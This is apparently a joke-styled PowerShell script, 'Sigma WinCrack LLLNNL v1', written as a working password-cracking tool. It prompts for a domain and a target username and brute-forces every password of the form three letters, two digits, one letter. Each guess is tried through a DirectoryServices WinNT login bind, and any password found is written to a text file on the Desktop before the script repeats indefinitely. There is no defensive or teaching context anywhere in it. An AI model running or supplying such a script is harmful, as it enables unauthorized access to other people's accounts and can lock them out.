# ===============================
# 💚 Sigma WinCrack LLLNNL v1 💚
# ===============================

[console]::Title = "WinCrack - Sigma LLLNNL Generator"
[console]::ForegroundColor = 'green'

function WinCrack {
    $domain = Read-Host "Domain (or COMPUTERNAME if local)"
    $user = Read-Host "Target Username"

    $letters = 'a'..'z'
    $numbers = 0..9
    $found = $false

    Write-Host "[START] Beginning LLLNNL gyat scan for $user on $domain"

    foreach ($l1 in $letters) {
        foreach ($l2 in $letters) {
            foreach ($l3 in $letters) {
                foreach ($n1 in $numbers) {
                    foreach ($n2 in $numbers) {
                        foreach ($l4 in $letters) {
                            $pwd = "$l1$l2$l3$n1$n2$l4"

                            try {
                                # attempt login using DirectoryEntry
                                $de = New-Object System.DirectoryServices.DirectoryEntry("WinNT://$domain/$user,user",$user,$pwd)
                                $null = $de.psbase.Invoke("IsAccountLocked")  # throws if wrong

                                Write-Host "[CLAP] Password found: $pwd" -ForegroundColor Green

                                # save the rizz so you never grind again
                                "$user : $pwd" | Out-File -FilePath "$env:USERPROFILE\Desktop\rizz.txt" -Append

                                $found = $true
                                break
                            } catch {}
                        }
                        if ($found) { break }
                    }
                    if ($found) { break }
                }
                if ($found) { break }
            }
            if ($found) { break }
        }
        if ($found) { break }
    }

    if (-not $found) { Write-Host "[FAIL] Could not find password with LLLNNL formula." -ForegroundColor Red }
}

while ($true) { WinCrack }
